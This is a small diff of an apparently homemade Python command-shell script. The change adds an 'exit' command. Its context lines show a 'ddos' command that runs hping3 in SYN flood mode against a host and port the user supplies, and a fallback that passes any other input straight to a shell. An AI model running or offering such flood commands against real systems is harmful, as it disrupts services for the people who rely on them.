@@ -35,12 +35,12 @@ def main():
             ifconfig("-a")
         elif command_.split(" ")[0] == "ddos":
             hping3("-S", "--flood", "--force-icmp", "--destport", "{}".format(command_.split(" ")[2]), command_.split(" ")[1])
+        elif command_.split(" ")[0] == "exit":
+            exit(0)
 
 
         else:
             print(sh("-c",command_))
-    
-
 
 while True:
     try: 
